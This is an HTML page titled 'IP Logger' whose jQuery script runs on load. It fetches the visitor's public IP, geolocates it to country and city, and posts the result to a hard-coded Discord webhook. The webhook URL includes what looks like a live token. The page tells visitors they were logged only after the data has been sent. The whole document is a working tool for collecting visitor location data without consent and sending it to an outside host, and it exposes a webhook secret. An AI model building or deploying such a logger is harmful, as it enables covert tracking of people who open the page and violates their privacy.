<!DOCTYPE html>
<html>
<head>
  <title>IP Logger</title>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script>
    $(document).ready(function() {
      var webhookUrl = "https://discord.com/api/webhooks/1201943878429577257/o1yNW-9fnWcP2SiwxIqjRZn3cW80V-rp6fAAyUw9F891i_QfkmApoY4PGdPm4ugE-kID";
      
      $.get("https://api.ipify.org?format=json", function(data) {
        var ip = data.ip;
        
        // Fetch IP information
        $.get("https://ipapi.co/" + ip + "/json/", function(info) {
          var country = info.country_name;
          var city = info.city;
          
          // Create Discord embed
          var embed = {
            title: "IP Logger",
            description: "IP Logged: " + ip,
            fields: [
              { name: "Country", value: country },
              { name: "City", value: city }
            ],
            color: 16711680 // Red color, you can change it
          };
          
          // Send embed to Discord webhook
          $.post(webhookUrl, { embeds: [embed] });
        });
      });
    });
  </script>
</head>
<body>
  <h1>IP Logger</h1>
  <p>Your IP address, along with the country and city information, has been logged and sent to a Discord webhook.</p>
</body>
</html>
